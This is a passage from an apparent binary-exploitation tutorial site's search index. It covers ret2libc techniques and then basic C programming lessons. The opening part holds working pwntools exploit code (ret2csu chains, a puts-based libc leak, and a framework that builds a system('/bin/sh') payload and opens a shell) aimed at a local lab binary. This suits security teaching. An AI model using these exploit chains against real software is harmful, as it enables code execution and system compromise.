leak_libc_base()\n\naslr_bypass_ret2libc()\n</code></pre>"},{"location":"binary-exploitation/protection/03-ret2libc/#ret2dl-resolve","title":"ret2dl-resolve","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef ret2dl_resolve():\n    \"\"\"Advanced ret2libc using dynamic linker resolution\"\"\"\n\n    def dl_resolve_concept():\n        \"\"\"Understand dynamic linker resolution process\"\"\"\n\n        dl_resolve_explanation = '''\n        Dynamic Linker Resolution Process:\n\n        1. First call to library function goes through PLT\n        2. PLT jumps to GOT entry (initially points to PLT)\n        3. PLT calls _dl_runtime_resolve()\n        4. _dl_runtime_resolve() resolves actual function address\n        5. GOT entry updated with real address\n        6. Future calls go directly to function\n\n        Exploitation:\n        - Control _dl_runtime_resolve() parameters\n        - Force resolution of any function\n        - Bypass ASLR by controlling resolution process\n        '''\n\n        print(dl_resolve_explanation)\n\n    def forge_relocation_table():\n        \"\"\"Forge relocation table entries\"\"\"\n\n        # This is an advanced technique that requires:\n        # 1. Understanding ELF structure\n        # 2. Control over multiple memory regions\n        # 3. Ability to forge relocation entries\n\n        forge_example = '''\n        Steps to forge relocation:\n        1. Create fake Elf64_Rela structure\n        2. Create fake Elf64_Sym structure  \n        3. Create fake string table entry\n        4. Point relocation to our structures\n        5. Call _dl_runtime_resolve with crafted index\n        '''\n\n        print(\"Relocation table forging:\")\n        print(forge_example)\n\n        # Example structures (simplified)\n        fake_rela = {\n            'r_offset': 0x404000,    # Where to write resolved address\n            'r_info': 0x100000007,   # Symbol index + relocation type\n            'r_addend': 0            # Addend for calculation\n        }\n\n        fake_sym = {\n            'st_name': 0x1000,       # Offset to symbol name in string table\n            'st_info': 0x12,         # Symbol type and binding\n            'st_other': 0,           # Symbol visibility\n            'st_shndx': 0,           # Section index\n            'st_value': 0,           # Symbol value\n            'st_size': 0             # Symbol size\n        }\n\n        print(\"Fake structures created for resolution\")\n\n    dl_resolve_concept()\n    forge_relocation_table()\n\ndef ret2csu():\n    \"\"\"ret2csu technique using __libc_csu_init gadgets\"\"\"\n\n    def csu_gadgets():\n        \"\"\"Universal gadgets in __libc_csu_init\"\"\"\n\n        # Most binaries have __libc_csu_init function\n        # This function contains useful gadgets for calling functions\n\n        csu_explanation = '''\n        __libc_csu_init contains universal gadgets:\n\n        pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret\n        mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]\n\n        This allows calling any function with controlled arguments:\n        - r13 (RDI): First argument\n        - r14 (RSI): Second argument  \n        - r15 (RDX): Third argument\n        - r12+rbx*8: Function to call\n        '''\n\n        print(csu_explanation)\n\n    def csu_exploit_example():\n        \"\"\"Example exploit using CSU gadgets\"\"\"\n\n        elf = ELF('./vuln_ret2libc')\n\n        # Find CSU gadgets\n        csu_pop_gadget = None\n        csu_call_gadget = None\n\n        # These are typically at predictable offsets in __libc_csu_init\n        csu_init = elf.symbols.get('__libc_csu_init')\n        if csu_init:\n            csu_pop_gadget = csu_init + 0x5a   # Typical offset\n            csu_call_gadget = csu_init + 0x40  # Typical offset\n\n        print(f\"CSU pop gadget: 0x{csu_pop_gadget:x}\")\n        print(f\"CSU call gadget: 0x{csu_call_gadget:x}\")\n\n        # Example: Call write(1, buffer, size) using CSU gadgets\n        def csu_write_call():\n            \"\"\"Use CSU to call write()\"\"\"\n\n            write_got = elf.got['write']  # Function to call\n            buffer_addr = 0x404000        # Buffer to write\n            size = 8                      # Size to write\n\n            payload = b'A' * 72\n\n            # First gadget: pop registers\n            payload += p64(csu_pop_gadget)\n            payload += p64(0)             # RBX\n            payload += p64(1)             # RBP\n            payload += p64(write_got)     # R12 (function pointer)\n            payload += p64(1)             # R13 (RDI - fd)\n            payload += p64(buffer_addr)   # R14 (RSI - buffer)\n            payload += p64(size)          # R15 (RDX - size)\n\n            # Second gadget: call function\n            payload += p64(csu_call_gadget)\n\n            # Stack adjustment after call\n            payload += p64(0) * 7         # Dummy values for stack cleanup\n\n            return payload\n\n        csu_write_call()\n\n    csu_gadgets()\n    csu_exploit_example()\n\nret2dl_resolve()\n</code></pre>"},{"location":"binary-exploitation/protection/03-ret2libc/#defensive-measures-and-bypasses","title":"Defensive Measures and Bypasses","text":""},{"location":"binary-exploitation/protection/03-ret2libc/#relro-and-ret2libc","title":"RELRO and ret2libc","text":"<pre><code>#!/usr/bin/env python3\n\ndef relro_impact_on_ret2libc():\n    \"\"\"How RELRO affects return-to-libc attacks\"\"\"\n\n    relro_levels = {\n        'No RELRO': {\n            'got_writable': True,\n            'plt_writable': True,\n            'impact': 'GOT overwrite attacks possible',\n            'ret2libc_effect': 'Minimal - all techniques work'\n        },\n        'Partial RELRO': {\n            'got_writable': False,\n            'plt_writable': True,\n            'impact': 'GOT entries read-only after initialization',\n            'ret2libc_effect': 'GOT overwrite prevented, PLT calls still work'\n        },\n        'Full RELRO': {\n            'got_writable': False,\n            'plt_writable': False,\n            'impact': 'All relocations resolved at load time',\n            'ret2libc_effect': 'Must use direct function addresses'\n        }\n    }\n\n    print(\"RELRO Impact on ret2libc:\")\n    for level, details in relro_levels.items():\n        print(f\"\\n{level}:\")\n        for key, value in details.items():\n            print(f\"  {key}: {value}\")\n\ndef fortify_source_bypass():\n    \"\"\"Bypass FORTIFY_SOURCE with ret2libc\"\"\"\n\n    fortify_explanation = '''\n    FORTIFY_SOURCE adds bounds checking to dangerous functions:\n    - strcpy() -&gt; __strcpy_chk()\n    - sprintf() -&gt; __sprintf_chk()\n    - memcpy() -&gt; __memcpy_chk()\n\n    ret2libc bypass strategies:\n    1. Call original functions directly (not checked versions)\n    2. Use functions not covered by FORTIFY_SOURCE\n    3. Call mprotect() to make stack executable, then use shellcode\n    4. Use execve() family functions directly\n    '''\n\n    print(\"FORTIFY_SOURCE bypass with ret2libc:\")\n    print(fortify_explanation)\n\n    def mprotect_shellcode_combo():\n        \"\"\"Use mprotect + ret2libc to enable shellcode execution\"\"\"\n\n        # Strategy: Use ret2libc to call mprotect() and make stack executable\n\n        mprotect_payload = '''\n        ROP Chain:\n        1. pop rdi; ret          -&gt; Stack address (page-aligned)\n        2. pop rsi; ret          -&gt; Page size\n        3. pop rdx; ret          -&gt; PROT_READ | PROT_WRITE | PROT_EXEC\n        4. mprotect address      -&gt; Make stack executable\n        5. shellcode address     -&gt; Jump to shellcode on now-executable stack\n        '''\n\n        print(\"mprotect + shellcode strategy:\")\n        print(mprotect_payload)\n\nrelro_impact_on_ret2libc()\n</code></pre>"},{"location":"binary-exploitation/protection/03-ret2libc/#complete-ret2libc-framework","title":"Complete ret2libc Framework","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\nclass Ret2libcFramework:\n    def __init__(self, binary_path, libc_path=None):\n        self.binary_path = binary_path\n        self.elf = ELF(binary_path)\n        self.libc = ELF(libc_path) if libc_path else None\n        self.gadgets = {}\n        self.leaked_addresses = {}\n\n    def find_gadgets(self):\n        \"\"\"Find useful ROP gadgets\"\"\"\n\n        rop = ROP(self.elf)\n\n        # Essential gadgets for x86_64\n        essential_gadgets = [\n            'pop rdi; ret',\n            'pop rsi; ret', \n            'pop rdx; ret',\n            'pop rax; ret',\n            'ret'\n        ]\n\n        print(\"Searching for gadgets...\")\n\n        for gadget_desc in essential_gadgets:\n            try:\n                if 'pop rdi' in gadget_desc:\n                    self.gadgets['pop_rdi'] = rop.find_gadget(['pop rdi', 'ret'])[0]\n                elif 'pop rsi' in gadget_desc:\n                    self.gadgets['pop_rsi'] = rop.find_gadget(['pop rsi', 'ret'])[0]\n                elif 'pop rdx' in gadget_desc:\n                    self.gadgets['pop_rdx'] = rop.find_gadget(['pop rdx', 'ret'])[0]\n                elif 'ret' == gadget_desc:\n                    self.gadgets['ret'] = rop.find_gadget(['ret'])[0]\n\n                print(f\"Found {gadget_desc}: 0x{self.gadgets.get(gadget_desc.split()[1], 0):x}\")\n\n            except:\n                print(f\"Could not find: {gadget_desc}\")\n\n    def analyze_functions(self):\n        \"\"\"Analyze available functions\"\"\"\n\n        plt_functions = []\n        got_functions = []\n\n        for func in ['system', 'execve', 'printf', 'puts', 'write', 'read']:\n            if func in self.elf.plt:\n                plt_functions.append((func, self.elf.plt[func]))\n            if func in self.elf.got:\n                got_functions.append((func, self.elf.got[func]))\n\n        print(\"Available PLT functions:\")\n        for func, addr in plt_functions:\n            print(f\"  {func}: 0x{addr:x}\")\n\n        print(\"Available GOT entries:\")\n        for func, addr in got_functions:\n            print(f\"  {func}: 0x{addr:x}\")\n\n        return plt_functions, got_functions\n\n    def find_strings(self):\n        \"\"\"Find useful strings in binary\"\"\"\n\n        useful_strings = [b'/bin/sh', b'/bin/bash', b'sh', b'cat', b'flag']\n        found_strings = {}\n\n        for string in useful_strings:\n            try:\n                addr = next(self.elf.search(string + b'\\x00'))\n                found_strings[string.decode()] = addr\n                print(f\"Found string '{string.decode()}': 0x{addr:x}\")\n            except:\n                continue\n\n        return found_strings\n\n    def leak_libc_address(self, target_binary):\n        \"\"\"Attempt to leak libc addresses\"\"\"\n\n        if 'puts' not in self.elf.plt:\n            print(\"No puts() available for leaking\")\n            return None\n\n        puts_plt = self.elf.plt['puts']\n        puts_got = self.elf.got['puts']\n        main_addr = self.elf.symbols.get('main')\n\n        if not all([puts_plt, puts_got, main_addr, self.gadgets.get('pop_rdi')]):\n            print(\"Missing requirements for libc leak\")\n            return None\n\n        print(\"Attempting libc leak...\")\n\n        p = process(target_binary)\n\n        # Build leak payload\n        payload = b'A' * 72  # Adjust offset\n        payload += p64(self.gadgets['pop_rdi'])\n        payload += p64(puts_got)\n        payload += p64(puts_plt)\n        payload += p64(main_addr)\n\n        p.sendline(payload)\n\n        try:\n            leaked = u64(p.recvline().strip().ljust(8, b'\\x00'))\n            print(f\"Leaked puts address: 0x{leaked:x}\")\n\n            if self.libc:\n                libc_base = leaked - self.libc.symbols['puts']\n                print(f\"Calculated libc base: 0x{libc_base:x}\")\n\n                self.leaked_addresses['libc_base'] = libc_base\n                self.leaked_addresses['system'] = libc_base + self.libc.symbols['system']\n                self.leaked_addresses['binsh'] = libc_base + next(self.libc.search(b'/bin/sh\\x00'))\n\n                return libc_base\n\n        except Exception as e:\n            print(f\"Leak failed: {e}\")\n\n        finally:\n            p.close()\n\n        return None\n\n    def generate_exploit(self, target='system'):\n        \"\"\"Generate complete exploit\"\"\"\n\n        if target == 'system':\n            if 'system' in self.leaked_addresses and 'binsh' in self.leaked_addresses:\n                # Use leaked addresses\n                system_addr = self.leaked_addresses['system']\n                binsh_addr = self.leaked_addresses['binsh']\n            elif 'system' in self.elf.plt:\n                # Use PLT entry\n                system_addr = self.elf.plt['system']\n                strings = self.find_strings()\n                binsh_addr = strings.get('/bin/sh')\n            else:\n                print(\"Cannot find system() or /bin/sh\")\n                return None\n\n            if not all([system_addr, binsh_addr, self.gadgets.get('pop_rdi')]):\n                print(\"Missing requirements for system() call\")\n                return None\n\n            # Build exploit payload\n            payload = b'A' * 72  # Buffer overflow\n            payload += p64(self.gadgets['pop_rdi'])\n            payload += p64(binsh_addr)\n            payload += p64(system_addr)\n\n            print(f\"Generated exploit calling system(0x{binsh_addr:x})\")\n            return payload\n\n        return None\n\n    def exploit(self):\n        \"\"\"Run complete exploitation process\"\"\"\n\n        print(f\"Analyzing binary: {self.binary_path}\")\n\n        # Step 1: Find gadgets\n        self.find_gadgets()\n\n        # Step 2: Analyze functions\n        self.analyze_functions()\n\n        # Step 3: Find strings\n        self.find_strings()\n\n        # Step 4: Attempt libc leak (if needed)\n        if self.libc:\n            self.leak_libc_address(self.binary_path)\n\n        # Step 5: Generate and test exploit\n        payload = self.generate_exploit()\n\n        if payload:\n            print(\"Testing exploit...\")\n            p = process(self.binary_path)\n            p.sendline(payload)\n            p.interactive()\n\n# Usage example\ndef demonstrate_ret2libc_framework():\n    \"\"\"Demonstrate the ret2libc framework\"\"\"\n\n    framework = Ret2libcFramework('./vuln_ret2libc', '/lib/x86_64-linux-gnu/libc.so.6')\n    framework.exploit()\n\n# demonstrate_ret2libc_framework()\n</code></pre>"},{"location":"binary-exploitation/protection/03-ret2libc/#key-takeaways","title":"Key Takeaways","text":"<p>ret2libc Fundamentals</p> <ul> <li>Bypasses NX/DEP protection - Executes existing code instead of injected shellcode</li> <li>Requires ROP gadgets - Need gadgets to set up function arguments</li> <li>ASLR complicates attacks - Must leak addresses or use information disclosure</li> <li>PLT entries are reliable targets - Less affected by ASLR than direct library addresses</li> <li>Multiple techniques available - From simple system() calls to complex dl-resolve</li> </ul> <p>Common Challenges</p> <ul> <li>Stack alignment requirements on x86_64</li> <li>Finding suitable ROP gadgets for argument setup</li> <li>RELRO protection limiting GOT overwrites</li> <li>FORTIFY_SOURCE changing function behavior</li> <li>Limited gadgets in smaller binaries</li> </ul> <p>Attack Strategies</p> <ul> <li>Start with information leaks to defeat ASLR</li> <li>Use puts() or printf() to leak libc addresses</li> <li>Chain multiple function calls for complex operations</li> <li>Consider CSU gadgets for universal argument setup</li> <li>Combine with other vulnerabilities for complete exploitation</li> </ul> <p>Next: ROP Techniques</p>"},{"location":"foundations/01-c-essentials-i/","title":"C Programming Essentials I","text":""},{"location":"foundations/01-c-essentials-i/#basic-syntax","title":"Basic Syntax","text":""},{"location":"foundations/01-c-essentials-i/#hello-world-and-program-structure","title":"Hello World and Program Structure","text":"<pre><code>#include &lt;stdio.h&gt;              // Preprocessor directive\n\nint main() {                    // Main function - entry point\n    printf(\"Hello, World!\\n\");  // Function call\n    return 0;                   // Return statement\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-i/#variables-and-constants","title":"Variables and Constants","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    // Variable declarations\n    int age;\n    float height = 5.9f;\n    char grade = 'A';\n\n    // Constants\n    const int MAX_SIZE = 100;\n    #define PI 3.14159  // Preprocessor constant\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-i/#operators","title":"Operators","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int a = 10, b = 3;\n\n    // Arithmetic operators\n    printf(\"a + b = %d\\n\", a + b);  // Addition\n    printf(\"a - b = %d\\n\", a - b);  // Subtraction\n    printf(\"a * b = %d\\n\", a * b);  // Multiplication\n    printf(\"a / b = %d\\n\", a / b);  // Division (integer)\n    printf(\"a %% b = %d\\n\", a % b); // Modulus\n\n    // Comparison operators\n    printf(\"a == b: %d\\n\", a == b); // Equal\n    printf(\"a != b: %d\\n\", a != b); // Not equal\n    printf(\"a &gt; b: %d\\n\", a &gt; b);   // Greater than\n    printf(\"a &lt; b: %d\\n\", a &lt; b);   // Less than\n\n    // Logical operators\n    int x = 1, y = 0;\n    printf(\"x &amp;&amp; y: %d\\n\", x &amp;&amp; y); // Logical AND\n    printf(\"x || y: %d\\n\", x || y); // Logical OR\n    printf(\"!x: %d\\n\", !x);         // Logical NOT\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-i/#control-structures","title":"Control Structures","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int num = 15;\n\n    // If-else statement\n    if (num &gt; 10) {\n        printf(\"%d is greater than 10\\n\", num);\n    } else if (num == 10) {\n        printf(\"%d is equal to 10\\n\", num);\n    } else {\n        printf(\"%d is less than 10\\n\", num);\n    }\n\n    // Switch statement\n    char grade = 'B';\n    switch (grade) {\n        case 'A':\n            printf(\"Excellent!\\n\");\n            break;\n        case 'B':\n            printf(\"Good job!\\n\");\n            break;\n        case 'C':\n            printf(\"Well done\\n\");\n            break;\n        default:\n            printf(\"Keep trying\\n\");\n            break;\n    }\n\n    // For loop\n    printf(\"For loop: \");\n    for (int i = 0; i &lt; 5; i++) {\n        printf(\"%d \", i);\n    }\n    printf(\"\\n\");\n\n    // While loop\n    printf(\"While loop: \");\n    int j = 0;\n    while (j &lt; 5) {\n        printf(\"%d \", j);\n        j++;\n    }\n    printf(\"\\n\");\n\n    // Do-while loop\n    printf(\"Do-while loop: \");\n    int k = 0;\n    do {\n        printf(\"%d \", k);\n        k++;\n    } while (k &lt; 5);\n    printf(\"\\n\");\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-i/#functions-and-parameter-passing","title":"Functions and Parameter Passing","text":"<pre><code>#include &lt;stdio.h&gt;\n\n// Function declaration (prototype)\nint add(int a, int b);\nvoid greet(char name[]);\nint factorial(int n);\nvoid swap_by_value(int a, int b);\nvoid swap_by_pointer(int *a, int *b);\n\nint main() {\n    int result = add(5, 3);\n    printf(\"5 + 3 = %d\\n\", result);\n\n    greet(\"Alice\");\n\n    printf(\"5! = %d\\n\", factorial(5));\n\n    // Call by value vs Call by pointer\n    int x = 10, y = 20;\n    printf(\"Before swap: x=%d, y=%d\\n\", x, y);\n\n    swap_by_value(x, y);  // Won't actually swap\n    printf(\"After call by value: x=%d, y=%d\\n\", x, y);\n\n    swap_by_pointer(&amp;x, &amp;y);  // Will swap\n    printf(\"After call by pointer: x=%d, y=%d\\n\", x, y);\n\n    return 0;\n}\n\n// Function definitions\nint add(int a, int b) {\n    return a + b;\n}\n\nvoid greet(char name[]) {\n    printf(\"Hello, %s!\\n\", name);\n}\n\nint factorial(int n) {\n    if (n &lt;= 1) {\n        return 1;\n    }\n    return n * factorial(n - 1);  // Recursive function\n}\n\n// Call by value - parameters are copies\nvoid swap_by_value(int a, int b) {\n    int temp = a;\n    a = b;\n    b = temp;\n    printf(\"Inside swap_by_value: a=%d, b=%d\\n\", a, b);\n}\n\n// Call by pointer - parameters are addresses\nvoid swap_by_pointer(int *a, int *b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n    printf(\"Inside swap_by_pointer: *a=%d, *b=%d\\n\", *a, *b);\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-i/#data-types-and-memory-layout","title":"Data Types and Memory Layout","text":""},{"location":"foundations/01-c-essentials-i/#basic-data-types","title":"Basic Data Types","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    char c = 'A';           // 1 byte\n    short s = 1000;         // 2 bytes\n    int i = 100000;         // 4 bytes (typically)\n    long l = 1000000L;      // 8 bytes (on 64-bit)\n    float f = 3.14f;        // 4 bytes\n    double d = 3.14159;     // 8 bytes\n\n    printf(\"Sizes: char=%zu, int=%zu, long=%zu\\n\", \n           sizeof(c), sizeof(i), sizeof(l));\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-i/#arrays-and-strings","title":"Arrays and Strings","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    // Array declaration and initialization\n    int numbers[5] = {1, 2, 3, 4, 5};\n    char vowels[] = {'a', 'e', 'i', 'o', 'u'};\n\n    // String handling\n    char message[6] = \"Hello\";  // Actually stores: 'H','e','l','l','o','\\0'\n    char buffer[128];           // Can store 127 characters + null terminator\n\n    // Single quotes ' are used for char\n    // Double quotes \" are used for string (null-terminated array of char)\n\n    printf(\"Message: %s (length: %zu)\\n\", message, strlen(message));\n    printf(\"Buffer size: %zu bytes\\n\", sizeof(buffer));\n    printf(\"Max string length in buffer: %zu characters\\n\", sizeof(buffer) - 1);\n\n    // Demonstrating null terminator\n    printf(\"Characters in 'Hello':\\n\");\n    for (int i = 0; i &lt;= 5; i++) {\n        printf(\"message[%d] = '%c' (ASCII: %d)\\n\", i, message[i], message[i]);\n    }\n\n    // String input with proper bounds checking\n    printf(\"Enter a string (max 127 chars): \");\n    if (fgets(buffer, sizeof(buffer), stdin)) {\n        // Remove newline\n        size_t len = strlen(buffer);\n        if (len &gt; 0 &amp;&amp; buffer[len-1] == '\\n') {\n            buffer[len-1] = '\\0';\n        }\n        printf(\"You entered: %s\\n\", buffer);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-i/#boolean-logic-in-c","title":"Boolean Logic in C","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;  // C99 standard - provides bool, true, false\n\nint main() {\n    // C does not have built-in Boolean values\n    // 0 represents False, any non-zero value represents True\n\n    int is_valid = 1;      // True\n    int is_empty = 0;      // False\n    int count = 42;        // Also True\n\n    printf(\"Boolean demonstrations:\\n\");\n    printf(\"is_valid (1): %s\\n\", is_valid ? \"True\" : \"False\");\n    printf(\"is_empty (0): %s\\n\", is_empty ? \"True\" : \"False\");\n    printf(\"count (42): %s\\n\", count ? \"True\" : \"False\");\n\n    // Using stdbool.h (C99 and later)\n    bool true_flag = true;\n    bool false_flag = false;\n\n    printf(\"\\nUsing stdbool.h:\\n\");\n    printf(\"true_flag: %s\\n\", true_flag ? \"True\" : \"False\");\n    printf(\"false_flag: %s\\n\", false_flag ? \"True\" : \"False\");\n\n    // Logical operations return 0 or 1\n    int result = (5 &gt; 3);  // result will be 1\n    printf(\"5 &gt; 3 evaluates to: %d\\n\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-i/#endianness","title":"Endianness","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    unsigned int x = 0x12345678;\n    unsigned char *ptr = (unsigned char*)&amp;x;\n\n    printf(\"Value: 0x%08x\\n\", x);\n    printf(\"Address: %p\\n\", ptr);\n    printf(\"Byte 0: 0x%02x\\n\", ptr[0]);\n    printf(\"Byte 1: 0x%02x\\n\", ptr[1]);\n    printf(\"Byte 2: 0x%02x\\n\", ptr[2]);\n    printf(\"Byte 3: 0x%02x\\n\", ptr[3]);\n\n    if (ptr[0] == 0x78) {\n        printf(\"System is Little Endian (most common)\\n\");\n    } else if (ptr[0] == 0x12) {\n        printf(\"System is Big Endian\\n\");\n    }\n\n    // Endianness is determined by the processor architecture\n    // Most modern systems (x86, x86_64, ARM) are little endian.\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-i/#basic-pointers","title":"Basic Pointers","text":""},{"location":"foundations/01-c-essentials-i/#introduction-to-pointers","title":"Introduction to Pointers","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int value = 42;\n    int *ptr = &amp;value;\n\n    // &amp; is the \"address-of\" operator; \n    // it gives the memory address of a variable.  \n\n    // * is the \"dereference\" operator; \n    // it accesses the value stored at a memory address (pointer)\n\n    printf(\"value = %d\\n\", value);\n    printf(\"Address of value (&amp;value) = %p\\n\", &amp;value);\n    printf(\"ptr = %p\\n\", ptr);\n    printf(\"Value pointed to by ptr (*ptr) = %d\\n\", *ptr);\n    printf(\"Address of ptr (&amp;ptr) = %p\\n\", &amp;ptr);\n\n    // Modifying through pointer\n    *ptr = 100;\n    printf(\"After *ptr = 100, value = %d\\n\", value);\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-i/#pointers-and-arrays","title":"Pointers and Arrays","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int arr[] = {10, 20, 30, 40, 50};\n    int *ptr = arr;  // arr is a pointer to first element\n\n    printf(\"Array elements using different notations:\\n\");\n    for (int i = 0; i &lt; 5; i++) {\n        printf(\"arr[%d] = %d, *(arr+%d) = %d, *(ptr+%d) = %d\\n\", \n               i, arr[i], i, *(arr + i), i, *(ptr + i));\n    }\n\n    // Pointer arithmetic\n    printf(\"\\nPointer arithmetic:\\n\");\n    printf(\"ptr points to: %d\\n\", *ptr);\n    ptr++;  // Move to next element\n    printf(\"After ptr++, points to: %d\\n\", *ptr);\n\n    return 0;\n}\n</code></pre> <p>Next: C Programming Essentials II</p>"},{"location":"foundations/01-c-essentials-ii/","title":"C Programming Essentials II","text":""},{"location":"foundations/01-c-essentials-ii/#advanced-pointers","title":"Advanced Pointers","text":""},{"location":"foundations/01-c-essentials-ii/#double-pointers-and-multi-level-indirection","title":"Double Pointers and Multi-level Indirection","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int value = 42;\n    int *ptr = &amp;value;      // ptr points to value\n    int **double_ptr = &amp;ptr; // double_ptr points to ptr\n\n    printf(\"value = %d\\n\", value);\n    printf(\"&amp;value = %p\\n\", &amp;value);\n    printf(\"ptr = %p\\n\", ptr);\n    printf(\"*ptr = %d\\n\", *ptr);\n    printf(\"&amp;ptr = %p\\n\", &amp;ptr);\n    printf(\"double_ptr = %p\\n\", double_ptr);\n    printf(\"*double_ptr = %p\\n\", *double_ptr);\n    printf(\"**double_ptr = %d\\n\", **double_ptr);\n\n    // Modifying through double pointer\n    **double_ptr = 100;\n    printf(\"After **double_ptr = 100, value = %d\\n\", value);\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-ii/#pointer-arithmetic","title":"Pointer Arithmetic","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int arr[] = {10, 20, 30, 40, 50};\n    int *ptr = arr;\n\n    printf(\"Array elements using pointer arithmetic:\\n\");\n    for (int i = 0; i &lt; 5; i++) {\n        printf(\"arr[%d] = %d, *(ptr+%d) = %d\\n\", \n               i, arr[i], i, *(ptr + i));\n    }\n\n    // Pointer subtraction\n    int *end = &amp;arr[4];\n    printf(\"Distance between pointers: %ld\\n\", end - ptr);\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-ii/#function-pointers","title":"Function Pointers","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint add(int a, int b) { return a + b; }\nint multiply(int a, int b) { return a * b; }\n\nint main() {\n    int (*operation)(int, int);\n\n    operation = add;\n    printf(\"5 + 3 = %d\\n\", operation(5, 3));\n\n    operation = multiply;\n    printf(\"5 * 3 = %d\\n\", operation(5, 3));\n\n    // Array of function pointers\n    int (*ops[])(int, int) = {add, multiply};\n    printf(\"Using array: %d, %d\\n\", ops[0](2, 3), ops[1](2, 3));\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-ii/#structures-and-memory-alignment","title":"Structures and Memory Alignment","text":""},{"location":"foundations/01-c-essentials-ii/#basic-structures","title":"Basic Structures","text":"<pre><code>#include &lt;stdio.h&gt;\n\nstruct Person {\n    char name[20];\n    int age;\n    float height;\n};\n\nstruct Point {\n    int x;\n    int y;\n};\n\nint main() {\n    struct Person p = {\"Alice\", 25, 5.6f};\n    struct Point pt = {10, 20};\n\n    printf(\"Person: %s, %d, %.1f\\n\", p.name, p.age, p.height);\n    printf(\"Point: (%d, %d)\\n\", pt.x, pt.y);\n    printf(\"Size of Person: %zu bytes\\n\", sizeof(struct Person));\n    printf(\"Size of Point: %zu bytes\\n\", sizeof(struct Point));\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-ii/#memory-alignment-and-padding","title":"Memory Alignment and Padding","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stddef.h&gt;\n\nstruct Unaligned {\n    char a;     // 1 byte\n    int b;      // 4 bytes (but needs alignment)\n    char c;     // 1 byte\n};\n\nstruct Aligned {\n    int b;      // 4 bytes\n    char a;     // 1 byte\n    char c;     // 1 byte\n};\n\nint main() {\n    printf(\"Unaligned struct size: %zu\\n\", sizeof(struct Unaligned));\n    printf(\"Aligned struct size: %zu\\n\", sizeof(struct Aligned));\n\n    printf(\"\\nUnaligned offsets:\\n\");\n    printf(\"a offset: %zu\\n\", offsetof(struct Unaligned, a));\n    printf(\"b offset: %zu\\n\", offsetof(struct Unaligned, b));\n    printf(\"c offset: %zu\\n\", offsetof(struct Unaligned, c));\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-ii/#bit-fields","title":"Bit Fields","text":"<pre><code>#include &lt;stdio.h&gt;\n\nstruct Flags {\n    unsigned int flag1 : 1;\n    unsigned int flag2 : 1;\n    unsigned int flag3 : 1;\n    unsigned int reserved : 5;\n    unsigned int value : 24;\n};\n\nint main() {\n    struct Flags f = {0};\n    f.flag1 = 1;\n    f.flag2 = 0;\n    f.flag3 = 1;\n    f.value = 0x123456;\n\n    printf(\"Struct size: %zu bytes\\n\", sizeof(struct Flags));\n    printf(\"Flags: %d %d %d, Value: 0x%x\\n\", \n           f.flag1, f.flag2, f.flag3, f.value);\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-ii/#dynamic-memory-management","title":"Dynamic Memory Management","text":""},{"location":"foundations/01-c-essentials-ii/#malloc-calloc-realloc-free","title":"malloc, calloc, realloc, free","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    // malloc - allocates uninitialized memory\n    int *arr1 = malloc(5 * sizeof(int));\n    if (arr1 == NULL) {\n        printf(\"Memory allocation failed\\n\");\n        return 1;\n    }\n\n    // Initialize manually\n    for (int i = 0; i &lt; 5; i++) {\n        arr1[i] = i * 10;\n    }\n\n    // calloc - allocates zero-initialized memory\n    int *arr2 = calloc(5, sizeof(int));\n    printf(\"Calloc initialized: \");\n    for (int i = 0; i &lt; 5; i++) {\n        printf(\"%d \", arr2[i]);\n    }\n    printf(\"\\n\");\n\n    // realloc - resize memory\n    arr1 = realloc(arr1, 10 * sizeof(int));\n    printf(\"After realloc: \");\n    for (int i = 0; i &lt; 10; i++) {\n        if (i &gt;= 5) arr1[i] = i * 10;\n        printf(\"%d \", arr1[i]);\n    }\n    printf(\"\\n\");\n\n    // Don't forget to free!\n    free(arr1);\n    free(arr2);\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-ii/#common-memory-errors","title":"Common Memory Errors","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid buffer_overflow_example() {\n    char buffer[10];\n    // Dangerous! No bounds checking\n    // strcpy(buffer, \"This string is way too long!\");\n\n    // Safer alternative\n    strncpy(buffer, \"Safe\", sizeof(buffer) - 1);\n    